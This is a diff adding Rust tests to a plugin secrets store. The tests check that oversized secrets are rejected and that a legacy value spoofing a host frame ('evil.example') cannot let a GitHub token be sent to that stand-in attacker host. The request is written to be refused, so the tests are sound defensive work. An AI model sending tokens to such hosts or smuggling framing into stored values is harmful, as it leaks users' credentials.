@@ -5,6 +5,7 @@ use std::sync::{Arc, Mutex};
 use super::*;
 use crate::exposure::holds;
 use crate::net::capture::{CaptureRules, SEND_HOSTS_MAX};
+use crate::secret::SECRET_BYTES_MAX;
 use crate::secrets::{
     HOSTS_HEADER_BYTES_MAX, Handles, OwnerEntry, PLUGIN_HANDLES_MAX, Scopes, Secrets,
 };
@@ -1573,4 +1574,69 @@ fn a_host_header_over_its_bound_is_refused_before_the_write() {
         Err(StoreError::code("secret_hosts_invalid"))
     );
     assert!(rig.store.items.lock().unwrap().is_empty());
+}
+
+#[test]
+fn a_legacy_item_that_looks_framed_binds_no_host() {
+    let rig = Rig::new(b"{}");
+    let old = reference(&format!("{NAMESPACE}.github"), "token").unwrap();
+    rig.store
+        .items
+        .lock()
+        .unwrap()
+        .insert(old, b"ca-hosts1|evil.example|x".to_vec());
+    let secrets = Secrets::for_request(&rig.store, NAMESPACE, &rig.scopes, &rig.handles, None);
+    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
+    let found = secrets.find("github", "token").unwrap().unwrap();
+    assert_eq!(
+        requests.request("github", bearing("https://evil.example/v1", found)),
+        Err(StoreError::code("secret_handle_refused"))
+    );
+}
+
+#[test]
+fn a_captured_value_over_the_secret_bound_is_refused_without_a_write() {
+    let long = "a".repeat(SECRET_BYTES_MAX + 1);
+    let rig = Rig::new(format!(r#"{{"access_token":"{long}"}}"#).as_bytes());
+    let secrets = Secrets::for_request(&rig.store, NAMESPACE, &rig.scopes, &rig.handles, None);
+    let requests = Requests::new(&secrets, &rig.egress, &rig.rules);
+    assert_eq!(
+        requests
+            .request(
+                "github",
+                kept(
+                    "https://github.com/login/oauth/access_token",
+                    "access_token",
+                    "n",
+                ),
+            )
+            .map(|_| ()),
+        Err(StoreError::code("credential_secret_invalid"))
+    );
+    assert!(rig.store.items.lock().unwrap().is_empty());
+}
+
+#[test]
+fn an_owner_value_over_the_secret_bound_keeps_the_old_item() {
+    let rig = Rig::new(b"{}");
+    let secrets = approved_for_api(&rig.store, &rig, &rig.handles);
+    secrets.put_from_owner("github", "token").unwrap();
+    let before = rig.store.items.lock().unwrap().clone();
+    let handles = Mutex::new(Handles::new());
+    let long = Secrets::for_request(
+        &rig.store,
+        NAMESPACE,
+        &rig.scopes,
+        &handles,
+        Some(OwnerEntry {
+            plugin: "github",
+            hosts: vec!["evil.example".to_owned()],
+            value: SecretString::bearer(vec![b'a'; SECRET_BYTES_MAX + 1]).unwrap(),
+        }),
+    );
+    assert_eq!(
+        long.put_from_owner("github", "token"),
+        Err(StoreError::code("credential_secret_invalid"))
+    );
+    assert_eq!(*rig.store.items.lock().unwrap(), before);
 }
